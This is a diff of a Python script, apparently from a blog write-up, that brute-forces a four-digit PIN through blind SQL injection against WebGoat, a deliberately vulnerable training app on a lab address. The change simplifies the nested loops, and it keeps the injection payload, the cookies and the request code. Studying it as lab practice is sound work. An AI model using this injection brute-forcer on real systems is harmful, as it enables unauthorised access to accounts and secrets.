@@ -52,24 +52,19 @@ def main():
 	}
 	cookies = dict(JSESSIONID="9807FE50B02B2B1D50B8113FFB60D0DC",acopendivids="swingset,jotto,phpbb2,redmine",acgroupswithpersist="nada")
 
-	attempts = 0
-	for x in range(0, 10):
-		for y in range(0, 10):
-			for z in range(0, 10):
-				for a in range(0, 10):
-					attempts += 1
-					pin = "{}{}{}{}".format(x,y,z,a)
-					print ("[*] Attempt {} | PIN {}".format(attempts, pin))
-					pin_request = '101;select * from pins where cc_number = 1111222233334444 and pin = {}--'.format(pin)
-					payload= {"account_number":pin_request,"SUBMIT":"Go%21"}
-					r = requests.post("http://192.168.56.101/WebGoat/attack?Screen=4&menu=1100", params=payload, headers=headers, cookies=cookies)
-					if r.status_code == 200:
-						if "account number is valid" in r.text.lower():
-							print ("[+] SUCCESS! PIN is: {}".format(pin))
-							sys.exit(0)
-					else:
-						print ("error: {}".format(r.text))
-						sys.exit(1)
+	for x in range(0, 10000):
+		pin = str(x).zfill(4)
+		print ("[*] Attempting PIN: {}".format(pin))
+		pin_request = '101;select * from pins where cc_number = 1111222233334444 and pin = {}--'.format(pin)
+		payload= {"account_number":pin_request,"SUBMIT":"Go%21"}
+		r = requests.post("http://192.168.56.101/WebGoat/attack?Screen=4&menu=1100", params=payload, headers=headers, cookies=cookies)
+		if r.status_code == 200:
+			if "account number is valid" in r.text.lower():
+				print ("[+] SUCCESS! PIN is: {}".format(pin))
+				sys.exit(0)
+		else:
+			print ("error: {}".format(r.text))
+			sys.exit(1)
 
 main()
 {% endhighlight %}
